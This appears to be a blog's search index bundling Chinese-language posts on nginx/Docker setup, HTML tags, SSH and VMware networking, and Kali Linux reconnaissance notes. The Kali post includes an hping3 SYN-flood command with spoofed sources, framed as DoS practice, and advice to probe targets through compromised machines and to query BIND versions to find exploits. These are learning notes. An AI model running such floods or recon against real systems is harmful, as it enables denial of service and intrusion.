/usr/share/nginx/html; } # proxy the PHP scripts to Apache listening on 127.0.0.1:80 # #location ~ \\.php$ { # proxy_pass http://127.0.0.1; #} # php相关配置 # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # location ~ \\.php$ { root /www; fastcgi_pass ip:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /www/$fastcgi_script_name; include fastcgi_params; } # deny access to .htaccess files, if Apache\u0026#39;s document root # concurs with nginx\u0026#39;s one # #location ~ /\\.ht { # deny all; #} }   ","permalink":"https://WnQinm.github.io/2022/10/php_docker/","tags":["net"],"title":"php(docker)联动nginx(docker)基础配置"},{"categories":["Docker"],"contents":"本篇在于利用nginx开启https访问以及设置主页 初始化 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  # 拷贝容器内配置文件到本地 $ docker run -d -p 80:80 --name nginx \\  -v /home/nginx/html:/usr/share/nginx/html \\  -v /home/nginx/logs:/var/log/nginx \\  nginx:latest $ docker container cp nginx:/etc/nginx /home/nginx/ $ cd /home/nginx $ mv nginx conf # 删除之前的容器 $ docker stop nginx $ docker rm nginx # 根据本地配置文件运行新容器 $ docker run -d -p 80:80 -p 443:443 --name nginx \\  -v /home/nginx/conf:/etc/nginx \\  -v /home/nginx/logs:/var/log/nginx \\  -v /home/nginx/html:/usr/share/nginx/html \\  nginx:latest   如果不需要配置ssl证书开启https访问,此时就可以把这个nginx当做普通静态服务器使用了 其中/home/nginx中的几个文件夹：  conf：nginx的配置文件，具体配置可以看官网 html：放静态资源，如html、css、js等 logs：日志文件夹，访问的日志可以在其中查看  改了配置文件，需要通过docker restart nginx重启nginx 配置SSL证书开启HTTPS访问 申请SSL证书 可以在腾讯云阿里云之类的地方申请的SSL证书 证书解压后上传到证书文件夹 在conf/conf.d创建cert证书文件夹 1 2  cd /home/nginx/conf/conf.d mkdir cert   把下载的证书上传的证书上传到这个文件夹 修改nginx配置开启HTTPS访问 vim /home/nginx/conf/conf.d/default.conf 写入以下内容： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  server { #SSL 访问端口号为 443 listen 443 ssl; #填写绑定证书的域名 server_name 0101.ml; #证书文件名称 ssl_certificate /etc/nginx/conf.d/cert/0101.ml_bundle.pem; #私钥文件名称 ssl_certificate_key /etc/nginx/conf.d/cert/0101.ml.key; ssl_session_timeout 5m; #请按照以下协议配置 ssl_protocols TLSv1 TLSv1.1 TLSv1.2; #请按照以下套件配置，配置加密套件，写法遵循 openssl 标准。 ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE; ssl_prefer_server_ciphers on; location / { #网站主页路径。此路径仅供参考，具体请您按照实际目录操作。 root /usr/share/nginx/html; index index.html index.htm; } } server { listen 80; #填写绑定证书的域名 server_name falser.top; #把http的域名请求转成https return 301 https://$host$request_uri; }   需要改的地方： server_name：改为自己的域名（两处） ssl_certificate：.pem后缀的证书文件 ssl_certificate_key：.key后缀的证书私钥文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  \u0026lt;!--50x.html--\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Error\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;An error occurred.\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Sorry, the page you are looking for is currently unavailable.\u0026lt;br/\u0026gt; Please try again later.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;If you are the system administrator of this resource then you should check the \u0026lt;a href=\u0026#34;http://nginx.org/r/error_log\u0026#34;\u0026gt;error log\u0026lt;/a\u0026gt; for details.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;em\u0026gt;Faithfully yours, nginx.\u0026lt;/em\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   ","permalink":"https://WnQinm.github.io/2022/10/nginx_docker/","tags":["net"],"title":"Nginx(docker)基础配置"},{"categories":null,"contents":"meta标签简介 meta标签特性  meta标签是单标签，格式如下 \u0026lt;meta 属性=\u0026quot;值\u0026quot;/\u0026gt; meta标签永远位于head元素内部 meta标签分两大部分：http标题信息(http-equiv) 和页面描述信息（name）  meta标签的http标题信息 http-equiv相当于http的文件头作用，它可以向浏览器传回一些有用的信息，以帮助正确和精确地显示网页内容 http-equiv属性语法格式：\u0026lt;meta http-equiv=\u0026quot;参数\u0026quot; content=\u0026quot;参数变量值\u0026quot;/\u0026gt; ==主要有以下几种参数：==  expires（期限） 可以用于设定网页的到期时间。一旦网页过期，必须到服务器上重新传输。 \u0026lt;meta http=equiv=\u0026quot;expires\u0026quot; content=\u0026quot;Wed,20 June 2016 10:30:00 GMT\u0026quot;\u0026gt; 注：必须使用GMT时间格式 pragma（cache模式） 禁止浏览器从本地计算机的缓存中调阅页面内容 \u0026lt;meta http-equiv=\u0026quot;pragma\u0026quot; content=\u0026quot;no-cache\u0026quot; 注：这样设定，访问者将无法脱机浏览 refresh（刷新） 定时刷新让网页自动链接到其他网页 \u0026lt;meta http-equiv=\u0026quot;refresh\u0026quot;content=\u0026quot;5;URL=//http://www.baidu.com\u0026quot;/\u0026gt; 注：其中的5是指停留5秒钟后自动刷新到URL网址，秒数和URL直接用分号隔开 content-type（显示字符集的设定） 设定页面使用的字符集 \u0026lt;meta http-equiv=\u0026quot;content-type\u0026quot; content=\u0026quot;text/html;charset=utf-8\u0026quot;/\u0026gt;  charset选项：  utf-8 （utf-8包含全世界所有国家需要用到的字符，是国际编码，通用性强，又称万国码。如：阿里云，淘宝网，等都采用这种编码方式） GBK （GBK是包含中日韩字符的大字符集合。如：京东网采用的是GBK编码） GB2312 （GB2312是GBK的子集，是一种简体中文编码，通行于中国大陆。如：腾讯网、网易等都采用该种编码）  meta标签的页面描述信息 name是描述网页的，对应于content（网页内容），以便于搜索引擎机器人查找、分类，目前几乎所有的搜索引擎都使用网上机器人自动查找meta值来给网页分类 name属性语法格式：\u0026lt;meta name=\u0026quot;参数\u0026quot; content=\u0026quot;具体参数值\u0026quot;/\u0026gt; ==主要有以下几种参数：==  keywords（关键字） 告诉搜索引擎你网页的关键字是什么 \u0026lt;meta name=\u0026quot;keywords\u0026quot; content=\u0026quot;网上购物,网上商城,手机,笔记本,电脑,MP3,CD,VCD,DV,相机,数码,配件,手表,存储卡,京东\u0026quot;/\u0026gt; 关键词之间用英文逗号隔开 description（网页描述） 告诉搜索引擎你的网页的主要内容 \u0026lt;meta name=\u0026quot;description\u0026quot; content=\u0026quot;京东JD.COM-专业的综合网上购物商城,销售家电、数码通讯、电脑、家居百货、服装服饰、母婴、图书、食品等数万个品牌优质商品.便捷、诚信的服务，为您提供愉悦的网上购物体验!\u0026quot;\u0026gt; robots（机器人向导） robots用来告诉搜索机器人哪些页面需要索引，哪些页面不需要索引。 content的参数有all、none、index、noindex、follow、nofollow。默认是all。 \u0026lt;meta name=\u0026quot;robots\u0026quot; contents=\u0026quot;all\u0026quot;/\u0026gt; 参数说明：  all：搜索引擎将索引此网页，且页面上的链接可以被查询，等价于index和follow none：搜索引擎将忽略此网页，且页面上的链接不可以被查询，等价于noindex和nofollow index：文件将被索引 follow：搜索引擎通过此网页的链接，索引搜索其他网页 noindex：文件将不被检索，但网页中的链接，可以索引搜索其它的网页 nofollow：文件将不被检索，搜索引擎不可以通过此网页的链接，继续索引其它网页   author（作者） 标注网页的作者或制作组 \u0026lt;meta name=\u0026quot;author\u0026quot; content=\u0026quot;作者的名字\u0026quot;/\u0026gt; ","permalink":"https://WnQinm.github.io/2022/10/meta_html/","tags":["net"],"title":"html meta标签简介"},{"categories":null,"contents":"此篇旨在解决vmware虚拟机桥接ping通外网的方法 1  $ vim /etc/network/interfaces   注意ip地址是自定义的，和物理机在同一网段的ip地址，网关是物理机的网关！ 1 2 3 4 5  $ vim /etc/resolv.conf domain nameserver 8.8.8.8 nameserver 114.114.114.114 nameserver [网关地址]   进入高级网络配置（不同系统不一样地方） 在ipv4设置中，方法选择手动，地址填写刚刚自定义的ip地址，以及子网掩码和网关 DNS服务器填一个8.8.8.8等，保存 命令行输入systemctl restart networking重启网络（不同系统不一样，实在不知道就重启虚拟机） ","permalink":"https://WnQinm.github.io/2022/09/vmware_net/","tags":["vmware"],"title":"vmware直接接入物理机所在网络"},{"categories":["Git"],"contents":"github上修改博客地址为个人购买的域名 打开github相应的仓库，我博客仓库结构为master储存页面代码，gh-page分支储存blog的public代码 在本地的master分支新建一个CNAME文件，写入注册好的域名（不带前缀），然后重新生成public文件，并将两个分支push到仓库 在DNS提供商网站上设置DNS解析记录：我这里是两个A（@-\u0026gt;ghpage的ip，www-\u0026gt;ghpage的ip）和一个CNAME（www-\u0026gt;ghpage域名） 去仓库的settings-\u0026gt;pages中的custom domain发现有刚刚写入CNAME的域名，点一下save等着就好，由于现在已经在dns提供商网站上设置好了域名解析，所以已经可以访问了！ ","permalink":"https://WnQinm.github.io/2022/09/ghpage/","tags":["git","net"],"title":"Github page域名解析设置"},{"categories":["Hack"],"contents":"本篇是kali基础的学习笔记 配置kali的apt在线安装包源 vim /etc/apt/sources.list 把原先的deb注释掉，然后添加： 1 2  deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib   然后apt update 其次通过下面的代码安装必要的工具 1 2 3 4 5 6 7 8 9 10 11 12 13 14  # 安装本体（只是一个空壳） docker pull kalilinux/kali-rolling # 这里面啥也无，先安装基本包 apt install kali-linux-core # 二百多兆，常见的简单工具 # 常用工具都在这里，好几个G apt install kali-linux-headless # 越来越大的包... kali-linux-large kali-linux-everything   利用第三方服务对目标进行被动信息收集防止被发现 被动信息收集 被动信息收集概述和目的 信息收集的方式可以分为两种：被动和主动 被动信息收集方式是指利用第三方服务对目标进行访问了解，例如google 主动的信息收集方式：通过直接访问、扫描网站，这种将流量流经网站的行为。比如nmap扫描端口 被动信息收集的目的：通过公开渠道去获得目标主机的信息，从而不与目标系统直接交互，避免留下痕迹 信息收集的内容  ip地址段 域名信息 邮件地址 文档图片数据 公司地址 公司组织架构 联系电话/传真号码 人员姓名/职务 目标系统使用的技术架构 公开的商业信息  信息用途  信息描述目标 发现目标 社会工程学攻击 物理缺口  信息收集-DNS 域名解析原理 DNS服务器概述： 运行DNS服务器程序的计算机，储存DNS数据库信息。 DNS服务器分为根域DNS服务器、顶级域名DNS服务器。根域DNS服务器有13个，都存储了全部的顶级域名服务器的所在地址；顶级域名服务器存储了每位客户所注册的主机地址，这里对应到 163.com. 这个级别。 域名记录：A,Cname,NS,MX,PTR (1) A记录（Address）正向解析: A记录是将一个主机名（全程域名FQDN）和一个IP地址关联起来。这也是大多数客户端程序默认的查询类型。例：wnqinm.cn-\u0026gt;6.6.6.6 (2) PTR记录（Pointer）反向解析: PTR记录将一个ip地址对应到主机名（全程域名FQDN）。这些记录保存在in-addr.arpa域中。 (3) CNAME记录（Canonical Name）别名： 别名记录，也成为规范名字（Canonical Name）。这种记录允许将多个名字映射到同一台计算机。例如：www.wnqinm.cn 对应 IP6.6.6.6，web.wnqinm.cn 对应IP 6.6.6.6 (4) MX记录（Mail eXchange） MX记录是邮件交换记录，它指向一个邮件服务器，用于电子邮件系统发邮件时根据收信人的地址后缀来定位服务器。@163.com 当有多个MX记录（即有多个邮件服务器）时，则需要设置数值来确定其优先级。通过设置优先级数字来指明首选服务器，数字越小表示优先级越高。 (5) NS记录（Name Server） NS记录时域名服务器记录，也成为授权服务器，用来指定该域名由哪个DNS服务器来进行解析 DNS缓存服务器 不负责解析域，只是缓存域名解析结果 DNS查询方式：递归查询和迭代查询 一个DNS查询过程，通过8个步骤的解析过程就使得客户端可以顺利访问 www.163.com 这个域名，但实际应用中，通常这个过程时非常迅速的，如图所示： DNS信息收集-NSLOOKUP  将域名解析为ip地址  通过域名获得ip地址最快速的方式：ping 1 2 3 4 5 6 7 8 9 10 11  # -c [num] 指定发送的数据包个数 $ ping www.baidu.com -c 3 PING www.a.shifen.com (180.101.49.11) 56(84) bytes of data. 64 bytes from 180.101.49.11 (180.101.49.11): icmp_seq=1 ttl=48 time=9.92 ms 64 bytes from 180.101.49.11 (180.101.49.11): icmp_seq=2 ttl=48 time=9.97 ms 64 bytes from 180.101.49.11: icmp_seq=3 ttl=48 time=9.91 ms --- www.a.shifen.com ping statistics --- 3 packets transmitted, 3 received, 0% packet loss, time 10168ms rtt min/avg/max/mdev = 9.911/9.931/9.969/0.026 ms   使用nslookup查看域名  1 2 3 4 5 6 7 8 9 10  $ nslookup www.baidu.com Server: 114.114.114.114 Address: 114.114.114.114#53 Non-authoritative answer: www.baidu.com canonical name = www.a.shifen.com. Name: www.a.shifen.com Address: 180.101.49.12 Name: www.a.shifen.com Address: 180.101.49.11   DNS信息收集-DIG 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  # dig [参数] 要查询的域名 # @\u0026lt;DNS服务器地址\u0026gt;\t：\t指定进行域名解析的域名服务器 # any\t显示所有类型的域名记录。默认只显示A记录 $ dig www.baidu.com ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.6-2-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; www.baidu.com ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 27865 ;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 512 ;; QUESTION SECTION: ;www.baidu.com. IN A ;; ANSWER SECTION: www.baidu.com. 519 IN CNAME www.a.shifen.com. www.a.shifen.com. 219 IN A 180.101.49.11 www.a.shifen.com. 219 IN A 180.101.49.12 ;; Query time: 12 msec ;; SERVER: 114.114.114.114#53(114.114.114.114) (UDP) ;; WHEN: Sat Sep 24 15:56:38 UTC 2022 ;; MSG SIZE rcvd: 101 $ dig @8.8.8.8 www.baidu.com ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.6-2-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; @8.8.8.8 www.baidu.com ; (1 server found) ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 2814 ;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 512 ;; QUESTION SECTION: ;www.baidu.com. IN A ;; ANSWER SECTION: www.baidu.com. 941 IN CNAME www.a.shifen.com. www.a.shifen.com. 116 IN A 180.101.49.11 www.a.shifen.com. 116 IN A 180.101.49.12 ;; Query time: 72 msec ;; SERVER: 8.8.8.8#53(8.8.8.8) (UDP) ;; WHEN: Sat Sep 24 15:56:53 UTC 2022 ;; MSG SIZE rcvd: 101 $ dig @8.8.8.8 www.baidu.com any   也可以通过ip来查询，需要在dig后加参数-x 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  $ dig -x 114.114.114.114 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.6-2-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; -x 114.114.114.114 ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 32637 ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 512 ;; QUESTION SECTION: ;114.114.114.114.in-addr.arpa. IN PTR ;; ANSWER SECTION: 114.114.114.114.in-addr.arpa. 379 IN PTR public1.114dns.com. ;; Query time: 12 msec ;; SERVER: 114.114.114.114#53(114.114.114.114) (UDP) ;; WHEN: Sat Sep 24 16:02:42 UTC 2022 ;; MSG SIZE rcvd: 89   查询DNS服务器bind版本信息 目的：可以通过版本信息来查找相关版本漏洞的利用方式 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  $ dig txt chaos VERSION.BIND @ns3.dnsv4.com\t# @后跟DNS服务器域名 ;; Warning: query response not set ;; Warning: Message parser reports malformed message packet. ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.6-2-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; txt chaos VERSION.BIND @ns3.dnsv4.com ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 48413 ;; flags: rd ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; WARNING: recursion requested but not available ;; QUESTION SECTION: ;VERSION.BIND. CH TXT ;; ANSWER SECTION: VERSION.BIND. 0 CH TXT \u0026#34;DNSPod AUTHORITY DNS 7.2.2203.01\u0026#34;\t# 版本信息 ;; Query time: 4 msec ;; SERVER: 61.151.180.49#53(ns3.dnsv4.com) (UDP) ;; WHEN: Sat Sep 24 16:10:08 UTC 2022 ;; MSG SIZE rcvd: 75   查询网站的域名注册信息和备案信息   域名注册信息 whois 域名 或 web接口查询   阿里云：www.whois.aliyun.com 站长之家：http://whois.chinaz.com/ 备案信息查询   web接口查询  https://website.informer.com/ http://icp.chinaz.com/ https://beian.miit.gov.cn/ https://tianyancha.com/    使用Maltego收集子域名信息 子域名介绍 顶级域名是域名的最后一个部分，即是域名最后一点之后的字母，例如在https://baidu.com这个域名中，顶级域是.com（或.COM），大小写视为相同 常见的顶级域主要分两类：  通用顶级类别域名共6个，包括用于科研机构的.ac；用于工商金融企业的.com；用于教育机构的.edu；用于政府部门的.gov；用于互联网络信息中心和运行中心的.net；用于非盈利组织的.org 国家及地区顶级域，如中国.cn，英国.uk，地理顶级域名一般由各个国家或地区负责管理  子域名（Subdomain Name），凡顶级域名前加前缀的都是该顶级域名的子域名，而子域名根据技术的多少分为二级子域名，三级子域名以及多级子域名 挖掘子域名的重要性 子域名是某个主域的二级域名或者多级域名，在防御措施严密的情况下无法直接拿下主域，那么就可以采用迂回战术拿下子域名，然后无限靠近主域  子域名挖掘工具：Maltego子域名挖掘机 搜索引擎挖掘 如：在Google中输入 site:qq.com 第三方网站查询：https://tool.chinaz.com/subdomain、https://dnsdumpster.com/ 证书透明度公开日志枚举：https://crt.sh/、https://censys.io/ 其他途径：https://phpinfo.me/domain、https://dns.aizhan.com  使用Maltego CE进行子域名挖掘 注册账号地址：https://www.maltego.com/ce-registration/ Shodan信息收集 Shodan介绍 Shodan直接进入互联网背后的通道搜索信息，一刻不停的寻找着所有和互联网关联的服务器、摄像头、打印机、路由器等。还可以直接显示出目标的具体地理位置信息 https://www.shodan.io 主动信息收集 主动信息收集的原理 主动信息收集的特点  直接与目标系统交互通信 无法避免留下访问痕迹 使用受控的第三方电脑进行探测，使用代理或已经被控制的机器，做好被封杀的准备 扫描发送不同的探测，根据返回的结果判断目标状态  发现目标主机的过程  识别存活主机，发现潜在的被攻击目标 输出一个ip地址列表比如ip地址段 ip地址范围 使用二、三、四层进行探测发现  OSI七层模型和TCP/IP五层模型 基于OSI模型进行扫描的优缺点   二层扫描的优缺点 优点：扫描速度快、可靠 缺点：不可路由   三层扫描的优缺点 优点：可路由，速度较快 缺点：速度比二层慢，经常被边界防火墙过滤 使用ip、icmp协议   四层扫描的优缺点   ​\t优点：可路由且结果可靠，不太可能被防火墙过滤，可以发现所有端口都被过滤的主机 ​\t缺点：基于状态过滤的防火墙可能过滤扫描，全端口扫描速度慢 基于ping命令的探测 ping ping命令是常用的判断主机之间网络是否畅通，同样也是能判断我们的目标主机是否存活 1 2 3 4 5 6 7  $ ping 172.17.0.3 -c 1 PING 172.17.0.3 (172.17.0.3) 56(84) bytes of data. 64 bytes from 172.17.0.3: icmp_seq=1 ttl=64 time=0.018 ms --- 172.17.0.3 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.018/0.018/0.018/0.000 ms   traceroute命令可以对路由进行跟踪 1 2 3 4 5 6 7 8 9  $ traceroute wnqinm.cn traceroute to wnqinm.cn (43.143.70.118), 30 hops max, 60 byte packets 1 172.17.0.1 (172.17.0.1) 0.025 ms 0.009 ms 0.008 ms 2 11.73.8.225 (11.73.8.225) 1.134 ms 11.73.8.193 (11.73.8.193) 1.389 ms 1.224 ms 3 * * * 4 * * * 5 * * * 6 * * * 7 * * *   ping命令也有很多延伸命令 ARPING  ARP协议概述：ARP协议是“Address Resolution Protocol”（地址解析协议）的缩写。计算机通过ARP协议将ip地址转换成MAC地址 原理：向目标计算机询问物理地址，保存在本地 使用arping命令查看局域网中的IP是否有冲突  使用Netdiscover进行被动方式探测局域网中存活的机器  Netdiscover是一个主动/被动的ARP侦查工具。使用Netdiscover工具可以在网络上扫描IP地址，检查在线主机或搜索为它们发送的ARP请求 主动模式：顾名思义就是主动探测发现网络内的主机，但是这种方式往往会引起网络管理员的注意 1 2 3 4 5 6 7 8 9 10 11  # -i 指定网卡 -r 指定网段 $ netdiscover -i eth0 -r 192.168.1.0/24 Currently scanning: Finished! | Screen View: Unique Hosts 12 Captured ARP Req/Rep packets, from 3 hosts. Total size: 720 _____________________________________________________________________________ IP At MAC Address Count Len MAC Vendor / Hostname ----------------------------------------------------------------------------- 192.168.1.1 00:50:56:c0:00:08 10 600 VMware, Inc. 192.168.1.2 00:50:56:e2:d2:17 1 60 VMware, Inc. 192.168.1.254 00:50:56:ea:83:5f 1 60 VMware, Inc.   被动模式：更加隐秘，但是速度会比较慢，网卡被设置为混杂模式来侦听网络内的arp数据表进行被动式探测，这种方式就需要网络内设备发送arp包才能被探测到 1 2  $ netdiscover -p ...   hping3 hping3是一个命令行下使用的TCP/IP数据包组装/分析工具，通常web服务会用来做压力测试使用，也可以进行DOS攻击的实验。同样hping只能每次扫描一个目标 1 2 3 4 5 6 7 8  # -c 1000\t发送的数据包的数量 # -d 120\t发送到目标机器的每个数据包的大小，单位是字节 # -S\t只发送SYN数据包 # -w 64\tTCP窗口的大小 # -p 80\t指定端口 # --flood\t尽可能快地发送数据包，不需要考虑显示入站回复。洪水攻击模式 # --rand-source\t使用随机的ip地址，这里伪造的ip地址只是在局域中伪造。通过路由器后，还会还原成真实的ip地址 hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source xxx.xxx   fping查看局域网中运行了那些机器 fping就是ping命令的加强版，它可以对一个ip段进行ping扫描，而ping命令本身是不可以对网段进行扫描的 1 2 3  # -g 表示对地址段进行扫描，如果不加可以对某个ip进行扫描 # -c 表示ping的次数 $ fping -g 192.168.1.0/24 -c 1 \u0026gt; fping.txt   ","permalink":"https://WnQinm.github.io/2022/09/kali_docker/","tags":["net","docker","hack"],"title":"Kali(docker)"},{"categories":null,"contents":"本篇旨在帮助利用ssh实现无需输入密码链接远程服务器或本地虚拟机 systemctl status sshd查看ssh服务是否启动 systemctl start sshd启动ssh服务 通过ssh 用户名@ip地址登录服务器 首次登录时需要确认密钥，必须输入完整的yes，然后输入密码即可登录 上面操作十分繁琐，通过公私钥登录服务器 ssh配置文件的位置：  Windows下，位于 %USERPROFILE%\\.ssh\\config linux/mac下，位于~/.ssh/config  Windows使用一下命令编辑，以防生成后缀名： 1 2 3  mkdir %USERPROFILE%\\.ssh echo. \u0026gt;\u0026gt; %USERPROFILE%\\.ssh\\config notepad %USERPROFILE%\\.ssh\\config   然后将以下内容输入config文件： 1 2 3 4  Host 服务器自定义名字 HostName 服务器公网ip Port ssh协议端口 User 用户名   现在便能不用输入用户名，只通过ssh 自定义名字来登录服务器 下面设置密钥登录，实现不用输入密码，而且比输入密码登录更安全 ssh-keygen -t ecdsa生成密钥对，然后一路回车即可（这里一路回车便设置密钥对密码为空，当然也可以根据提示设置一个密码） 私钥文件为id_ecdsa,公钥文件为id_ecdsa.pub 通过命令ssh-copy-id -i ~/.ssh/id_ecdsa.pub 服务器自定义名字 如果上面命令报错command not found，首先输出公钥内容：type .ssh\\id_ecdsa.pub 然后登录到服务端，vim ~/.ssh/authorized keys，将公钥添加到后面，这一个文件可以有多个公钥，注意此文件权限为：-rw------- 再编辑前面的config文件： 1 2 3 4 5 6  Host 服务器自定义名字 HostName 服务器公网ip Port ssh协议端口 User 用户名 IdentitiesOnly yes IdentityFile 私钥位置   Windows写C:\\User\\[用户名]\\.ssh\\id_ecdsa ","permalink":"https://WnQinm.github.io/2022/09/ssh_help/","tags":["net"],"title":"ssh基础配置"},{"categories":null,"contents":"本篇是关于html基础标签的介绍 网页基本信息  DOCTYPE  告诉浏览器我们要使用什么规范   html  所有内容必须包含在html这个总标签里   head  代表网页头部   body  代表网页主体   title  表示网页标题，显示在标签选项卡处   meta  描述性标签 一般用来做SEO    1 2  \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;!-- 网页编码格式 --\u0026gt; \u0026lt;meta name=\u0026#34;\u0026#34; content=\u0026#34;\u0026#34;\u0026gt; \u0026lt;!-- 键值对 --\u0026gt;   键：keywords网页关键词，description网页作用详细描述 网页基本标签 标题标签 1 2  \u0026lt;h1\u0026gt;一级标签\u0026lt;/h1\u0026gt; \u0026lt;h2\u0026gt;二级标签\u0026lt;/h2\u0026gt;   可一直到六级 段落标签 文字之间不管有多少空格，都只算一个空格 \u0026lt;p\u0026gt;content\u0026lt;/p\u0026gt; 换行标签 \u0026lt;br/\u0026gt; 该标签是自闭合标签，也可不加/ 水平线标签 \u0026lt;hr/\u0026gt; 同样是自闭合标签 粗体斜体 1 2  \u0026lt;!--粗体--\u0026gt; \u0026lt;strong\u0026gt;i love you\u0026lt;/strong\u0026gt; \u0026lt;!--斜体--\u0026gt; \u0026lt;em\u0026gt; i love you \u0026lt;/em\u0026gt;   特殊符号 (常用) 1 2 3 4 5  \u0026lt;!--注释--\u0026gt; 快捷键ctrl+/ \u0026lt;!--空格--\u0026gt; \u0026amp;nbsp; \u0026lt;!--大于--\u0026gt; \u0026amp;gt; \u0026lt;!-- 小于--\u0026gt;\u0026amp;lt; \u0026lt;!--版权符号--\u0026gt;\u0026amp;copy;   图像标签 常见图像格式 jpg，png/gif动态图/bmp位图 嵌入图片 1 2  \u0026lt;img src=\u0026#34;path\u0026#34; alt=\u0026#34;text\u0026#34; title=\u0026#34;text\u0026#34; width=\u0026#34;x\u0026#34; height=\u0026#34;y\u0026#34;/\u0026gt; \u0026lt;!-- scr图像地址(路径)，alt图像的替代文字（如果加载失败），title鼠标悬停提示文字，图像宽度高度--\u0026gt;   地址 绝对地址：从盘符开始的是绝对地址 相对地址：用../代表上一级目录，即从源文件同级文件夹写起地址 超链接  页面间链接：从一个页面链接到另一个页面 锚链接 功能性链接  链接标签(a标签) 页面间链接 1 2  \u0026lt;a href=\u0026#34;path\u0026#34; target=\u0026#34;目标窗口位置\u0026#34;\u0026gt;链接文本或图像\u0026lt;/a\u0026gt; \u0026lt;!-- href链接路径，target链接在哪个窗口打开--\u0026gt;   链接路径也可直接写文件名，跳转到同一文件夹下目标页面 目标窗口位置常用值：_self,_blank 链接文本或图像就是链接提示文字或图片，点击进行链接 1 2 3 4  \u0026lt;!--嵌套图像标签，即点击图片进行跳转--\u0026gt; \u0026lt;a href=\u0026#34;路径\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;path\u0026#34; alt=\u0026#34;text\u0026#34; title=\u0026#34;text\u0026#34; width=\u0026#34;x\u0026#34; height=\u0026#34;y\u0026#34;/\u0026gt; \u0026lt;/a\u0026gt;   target:表示窗口在哪里打开 如果不设置target，则在当前页面刷新 _blank：在新标签页打开 _self:在自己的网页中打开 锚链接  需要一个锚标记 跳转到标记  1 2 3 4 5  \u0026lt;!--设置锚标记--\u0026gt; \u0026lt;a name=\u0026#34;锚\u0026#34;\u0026gt;链接文本或图像\u0026lt;/a\u0026gt; \u0026lt;!--设置标记--\u0026gt; \u0026lt;a herf=\u0026#34;#锚\u0026#34;\u0026gt;链接文本或图像\u0026lt;/a\u0026gt; \u0026lt;!--跳转到标记--\u0026gt; \u0026lt;!--锚链接也可进行页面间跳转，先假设该源文件同一文件夹下有源文件‘project.html’--\u0026gt; \u0026lt;a href=\u0026#34;project.html#锚\u0026#34;\u0026gt;链接文本或图像\u0026lt;/a\u0026gt; \u0026lt;!--跳转到标记--\u0026gt;   在网址后进行锚链接可直接跳转到网页对应位置 功能性链接  邮件链接：mailto QQ链接：打开qq推广https://shang.qq.com \u0026ndash;推广工具设置即可得到一个a标签  行内元素和块元素  块元素  无论内容多少，该元素独占一行 p，h1-h6   行内元素  内容撑开宽度，左右都是行内元素的可以排在一行 a，strong，em    列表  无序列表 有序列表(order list) 自定义列表  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  \u0026lt;!--有序列表--\u0026gt; \u0026lt;ol\u0026gt; \u0026lt;li\u0026gt;java\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;python\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;c/c++\u0026lt;/li\u0026gt; \u0026lt;/ol\u0026gt; 